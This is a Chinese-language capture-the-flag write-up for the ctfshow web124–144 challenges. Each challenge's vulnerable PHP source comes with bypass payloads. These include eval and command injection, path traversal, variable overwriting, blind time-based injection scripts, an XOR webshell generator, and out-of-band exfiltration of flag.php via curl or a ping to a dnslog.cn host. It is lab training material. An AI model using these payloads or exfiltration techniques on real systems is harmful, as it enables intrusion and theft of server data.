# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

有eval，那么只用关注$c就行，只要进入if即可，在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，所以按理来说我们构造不出`CTF_SHOW.COM`这个变量(因为含有`.`)，但php中有个特性就是如果传入`[`，它被转化为`_`之后，后面的字符就会被保留下来不会被替换，所以就可以传这个参数了

```none
payload
CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag
```

### web125

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
#
#
*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

过滤了echo 和flag，可以用highlight_fike来显示，用Get来传参

```none
payload:
url/?aaa=flag.php
CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[aaa])
```

### web126

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
#
#
*/
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

过滤一些字母，限制了$c的长度，不能用上一题的payload了，本题要用到$_SERVER,

```none
$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。
不同的参数保存不同的信息，比如，
$_SERVER['argv'] //传递给该脚本的参数。
$_SERVER['argc'] //传递给程序的命令行参数的个数。
```

[博客](https://www.wlhhlc.top/posts/14827/#web115)wp中有做测试：

![img](https://howahh.github.io/images/image-20210530183345448.png)

可以看到$_SERVER[‘argv’]储存了get到的参数，所以通过这一点构造payload

```none
payload:
url/?$fl0g=flag_give_me;
CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])

$c="eval($a[0])"
$a[0]="$fl0g=flag_give_me;"
$c="eval($fl0g=flag_give_me;)"
eval($c;)
eval(eval($fl0g=flag_give_me;);)
```

### web127

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-10 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-10 21:52:49

*/


error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```

这里的extract 函数从数组中将变量导入到当前的符号表。

![img](https://howahh.github.io/images/image-20210530204342545.png)

所以这里

用extract函数来讲$ctf_show转化为想要的值，想直接url/?ctf_show=ilove36d,但不行，这里对$url做了正则匹配，下划线被过滤了，但php中变量中的空格，[，+会被替换为_，且空格没被过滤，就可以使用空格，且这里

```none
http://localhost/aaa/?p=222 (附带查询)
结果：
$_SERVER['QUERY_STRING'] = "p=222";
$_SERVER['REQUEST_URI']  = "/aaa/?p=222";
$_SERVER['SCRIPT_NAME']  = "/aaa/index.php";
$_SERVER['PHP_SELF']     = "/aaa/index.php";
所以这里$_SERVER['QUERY_STRING']="ctf_show=ilove36d"

payload:
url/?ctf show=ilove36d
```

### web128

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-10 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-12 19:49:05

*/


error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

check函数过滤掉了所有字符和数字，只能用特殊字符。

call_user_func函数把第一个参数作为回调函数，其余参数都是回调函数的参数

```none
此题用到了gettext扩展，而_()等效于gettext(),gettext是GNU国际化与本地化函数库。它常被用于编写多语言程序.源代码中所有需要多语言支持的（需要翻译的）字符串都修改为使用gettext函数包装起来。为了方便也可以使用下划线 _。本题通过此方法和两次的call_user_func来绕过限制。
本题还会用到get_defined_vars 
get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
可以得到payload：
?f1=_&f2=get_defined_vars

var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
var_dump(call_user_func(get_defined_vars));//输出数组
```

### web129

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 03:18:40

*/


error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

本题考察了目录穿越

```none
路径穿越是网站被恶意人员利用，来得到其无权限访问的内容

通常是由于代码没有判断 拼接路径的真实路径是否合法，最终导致文件读取

Web程序应该有很好的权限控制，为了避免使用者读取到服务器上未经许可的文件，通常会通过“根目录”这种机制加以限制。一般来讲，用户在网站进行浏览，所能见到的网页都是位于网站根目录下的文件。根目录以外的文件是不允许被未授权访问的。

但是安全方面做得不严谨的web程序可能会出现目录穿越漏洞，恶意人员可以利用这个漏洞来读取根目录以外的文件夹。一旦成功，本不应该暴露的敏感信息就可能会被泄漏给恶意人员。
```

常见造成目录穿越的函数：

```php
文件读取代码：
file_get_contest

<?php
$filename=$_GET['m'];
echo file_get_contest($filename);
?>
fopen,fread

<?php
$filename=$_GET['m'];
$fp=fopen($filename,"r") or die ("unable open!");
echo fread($fp,filesize($filename));
fclose($fp);
?>
readfile

<?php
$filename=$_GET['m'];
readfile($filename);
?>
```

目录穿越主要是通过`../`等造成访问非法路径造成的。

```none
payload:
?f=/ctfshow/../../../../../../../../../var/www/html/flag.php
（测试少几个../都可以，具体后续学习记录）
或者
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
```

### web130

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

这里考察了一次正则表达式

`/.+?ctfshow/is`这里的`.`要求ctfshow之前必须有别的字符，所以f=ctfshow就可以直接绕过了正则表达。

```none
payload:
f=ctfshow
```

### web131

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 05:19:40

*/


error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

在ctfshow前加了36D,此时需要用到正则表达式溢出来做

```
当要匹配的字符串长度大于100014的时候, 就不会得出正确结果
```

这是因为正则表达式回溯的问题，在PHP的pcre扩展中, 提供了俩个设置项.

```none
1. pcre.backtrack_limit //最大回溯数
2. pcre.recursion_limit //最大嵌套数
默认的backtarck_limit是100000(10万).
如果回溯次数超过了这个值则preg_match会返回NULL
```

具体可以参见[博客](https://www.laruence.com/2010/06/08/1579.html)

不是很懂wp给出的payload，用一个脚本解决

```python
import requests
url="http://990f2696-ba59-4354-b875-3be043695f59.challenge.ctf.show:8080/"
data={
    "f":'very'*250000+'36Dctfshow'
}
resp=requests.post(url=url,data=data)
print(resp.text)
```

![img](https://howahh.github.io/images/image-20210531131705457.png)

得到flag

### web132

点开后发现是个界面，要访问robots.txt

![img](https://howahh.github.io/images/image-20210531133551148.png)

![img](https://howahh.github.io/images/image-20210531133606470.png)

访问url/admin/ 就可以得到源码，`这里发现访问url/admin`，就不行，端口会没了，也不知道是为什么，访问后得到源码界面

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 06:22:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 20:05:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

这里通过php表达式优先级解题，

```none
在php中&&的优先级 高于||，所以if、语句中的判断只需要满足username="admin",就可以进入下一个if，让code=“admin”就可以解出了
payload:
url/admin/?username=admin&code=admin&password=aaa
```

### web133

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 16:43:44

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

substr截取限制了6个字母，这里用到套娃的思路来扩展我们执行的空间

```none
先尝试：
/?F=`$F `;sleep 3	//注意$F后有空格，这样到分号刚好6个字符
这样传入的话可以得到eval(`$F `;)，而$F=`$F `;sleep 3
``反引号是shell_exec()函数的缩写，以命令行形式执行命令
这样会执行命令`$F `;也即shell_exec($F)==>shell_exec(`$F `;sleep 3)
我们就可以成功执行sleep 3了，因为是在shell里执行了，所以前面的表达式不管了，我们通过分号后的表达式来执行想要的命令
所以这是无回显的RCE题目
无回显我们可以用反弹shell 或者curl外带 或者盲注
这里的话反弹没有成功，但是可以外带。
```

通过对`curl`的应用，利用curl去带出flag.php，使用burp中的Collaborator Client，获取flag。curl -F 将flag文件上传到Burp的 Collaborator Client[Collaborator原理与使用](https://blog.csdn.net/fageweiketang/article/details/89073662)

```none
curl 是常用的命令行工具，用来请求 Web 服务器，-F参数用来向服务器传输二进制文件，-X参数用来指定http代理
```

[curl用法](http://www.ruanyifeng.com/blog/2019/09/curl-reference.html)

简单来说就是通过curl让目标服务器向burp给出的服务器发送我们想要的东西，用burp来截获信息

![img](https://howahh.github.io/images/image-20210531154407133.png)

### web134

变量覆盖的一道题，因为有函数parse_str()和extract()

```none
extract — 从数组中将变量导入到当前的符号表
parse_str — 将字符串解析成多个变量
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-14 23:01:06

*/

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

主要就是extract($_POST)可以做文章

$_SERVER[‘QUERY_STRING’]会记录url后面的问号后面的所有语句

```none
payload:
url/?_POST[key1]=36d&_POST[key2]=36d
传入后的过程：
$_SERVER['QUERY_STRING']="_POST[key1]=36d&_POST[key2]=36d"
@parse_str($_SERVER['QUERY_STRING']);==>@parse_str(_POST[key1]=36d&_POST[key2]=36d)
执行后
$_POST[key1]=36d  $_POST[key2]=36d
此时再执行extract($_POST)
$key1=36d	$key2=36d
```

### web135

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

133加强版，过滤了curl，这就更能不会了，看wp看到了非预期解，把flag.php的内容通过命令复制给1.txt，直接访问就可以了

```none
payload:
`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn	//预期，后面再看吧
?F=`$F `;cp flag.php 1.txt	//非预期
```

试了一下发现非预期在133不能用，出题人说是因为出题的时候忘记了修改写入权限

### web136

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

过滤了很多的命令和字符，我是真不知道还能用什么，wp说用tee命令

```none
Linux tee命令用于读取标准输入的数据，并将其内容输出成文件
用法:
tee file1 file2 //复制文件
ls|tee 1.txt //命令输出到1.txt文件中
```

先url/?c=ls /|tee a

将ls输入到a中，访问url/a，会让下载文件，下载，后得到

![img](https://howahh.github.io/images/image-20210531173017907.png)

再用同样的方法cat访问f149_15_h3r3即可

```none
url/?c=cat /f149_15_h3r3| tee b
```

访问b，下载打开即得到flag

![img](https://howahh.github.io/images/image-20210531173356069.png)

### web137

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:27:49

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}



call_user_func($_POST['ctfshow']);
```

call_user_func()，见了很多了，将传入的参数作为回调函数使用，这里只需要调用ctfshow类中的getFlag函数即可，所以

```none
payload:
ctfshow=ctfshow::getFlag

在php中：
->用来引用一个类的属性（变量）、方法（函数）
=>是用来定义数组用的
：：用来直接调用类中的属性或方法（不需要实例化的调用）
$this->表示实例化后的具体对象
 
```

### web138

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 22:52:13

*/

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

过滤了::，通过call_user_func()可以传入数组进行绕过,举例如何用call_user_func()来调用一个类里面的方法

```php
<?php

class myclass {
    static function say_hello()
    {
        echo "Hello!\n";
    }
}

$classname = "myclass";

call_user_func(array($classname, 'say_hello'));
call_user_func($classname .'::say_hello'); // As of 5.2.3

$myobject = new myclass();

call_user_func(array($myobject, 'say_hello'));

?>
payload:
ctfshow[0]=ctfshow&ctfshow[1]=getFlag

这样相当于：
call_user_func(array("ctfshow", ‘getFlag’));调用了ctfshow类中的getFlag方法
```

### web139

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

看起来和136相同，但没有了写入权限，不能用tee了，本题需要通过盲注来做

```python
import requests
url="http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="
re=""
for i in range(1,10):
    for j in range(1,20):
        for k in range(32,128):
            k=chr(k)
            # payload = f"if[`ls / | awk NR=={i} | cut -c {j}`=={k} ];then sleep 2;fi"
            # payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            # print(payload)
            payload ="if [ `ls / | awk NR=={0} | cut -c {1}` == {2} ];then sleep 2;fi".format(i,j,k)
            try:
                requests.get(url+payload,timeout=(1.5,1.5))
            except:
                re=re+k
                print(re)
                break
        re=re+" "
```

这是得到flag存放位置的脚本，其中主要是payload需要注意，用到了shell编程

```none
if是判断，fi是if结束，[]里的是主要内容
awk命令 awk是一种处理文本文件的语言，是一个强大的文本分析工具 其中NR是其内建变量，已经读出的记录数，就是行号，从1开始
cut命令 cut是分割的命令，-c 是以字符为单位 进行分割
这里的意思是对ls出来的每一行字符串的每一个字符进行if判断，该字符盲注成功的话就会sleep两秒，这样就会触发except，re就是我们想得到的值
```

![img](https://howahh.github.io/images/image-20210531215201372.png)

该脚本得到上图，我们可以得到一个f149_15_h3r3文件，存放这外卖想要的flag，接下来只用改一下上面的脚本来跑flag就行了

```python
import requests
url="http://7b5658de-1c24-4882-9d46-8bbf2a122364.challenge.ctf.show:8080/?c="
re=""
for j in range(1,50):
    for k in range(32,128):
        k=chr(k)
        # payload = f"if[`ls / | awk NR=={i} | cut -c {j}`=={k} ];then sleep 2;fi"
        # payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
        # print(payload)
        payload ="if [ `cat /f149_15_h3r3 | cut -c {0}` == {1} ];then sleep 2;fi".format(j,k)
        try:
            requests.get(url+payload,timeout=(1.5,1.5))
        except:
            re=re+k
            print(re)
            break
        
```

![img](https://howahh.github.io/images/image-20210531220631659.png)这里字符数少了点，重新跑没截图，因为过滤所以没有{}最后加上{}即可

这样直接来有的时候网不好容易出错，在payload前加一个time.sleep(0.1)有帮助

### web140

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 12:39:25

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

![img](https://howahh.github.io/images/image-20210531225804454.png)

![img](https://howahh.github.io/images/image-20210531225817212.png)

用到了松散比较==的特性

```none
0和字符串进行弱比较的时候返回的是true，因为==在进行比较的时候，会先将字符串类型转化成相同，再比较，而ctfshow是一个字符串，和0相比较的时候要转换成数字，ctfshow转换成数字的时候是0，所以相等返回true
而intval()函数会将非数字或非数字字符串转换为0，所以$code需要为字符，也就是我们传入的f1和f2互相构造即可
可以使用如下：
md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1
usleep(usleep())
```

### web141

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

正则表达`/^\W+$/`，意味着ban掉了所有数字字母，这是一道无数字字母的webshell题，可以使用异或，取反等绕过，需要使用到脚本，这里自己在网上看了一下，学着写了一个用异或完成的，简单来说就是遍历字符表来异或，找到符合要求的记录下来，再输入想要的指令，在记录中遍历查找到 即可形成无数字字母的shell

```python
import re
#异或无数字字母绕过
#取得可用字符串放入文件
def get_xor_words():
    preg='[a-zA-Z0-9]'
    result=''
    #遍历扩展ascii码表
    for i in range(256):
        for j in range(256):
            if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):
                k=i^j
                #k在可显示字符中
                if k>=32 and k<=126:
                    # 以URL编码方式存储
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f=open('xor_file.txt','w')
    f.write(result)
#通过输入的命令获取无数字字母命令
def get_order(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_file.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
        #异或后存入
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)

def main():
    get_xor_words()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = get_order(s1) + get_order(s2)
        print("\n[*] result:\n" + param+";")

main()
```

这个脚本可以保存下来，基本是通用的。输入想要的指令即可

![img](https://howahh.github.io/images/image-20210607181216096.png)

本题中v1，v2填随意数字，v3就result即可，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如`\+ - *` 等等

最后使用命令system(“tac flag.php”);即可得到flag

### web142

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-17 19:36:02

*/

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```

直接传一个0即可，传0的话0会被is_numeric识别为二进制进而可以进入if，也可以传0x0，这样是十六进制，查看源码即可得到flag

### web143

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 12:48:14

*/

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

和141类似，只是多ban掉了一些特殊字符，但没有ban^，也即取异或，所以直接用141的脚本，稍微改一下正则限制即可

![image-20210607183743506](https://howahh.github.io/images/image-20210607183743506.png)

注意过滤了分号，所以最后的payload形式：

```none
v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%0c%01%07%01%0f%08%0f"^"%7f%60%60%20%60%60%60%60%2f%7f%60%7f")*
```

### web144

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-18 16:21:15

*/

highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
```

和141一样，只是换成了v2，没什么差别

- **本文作者：** 0xahh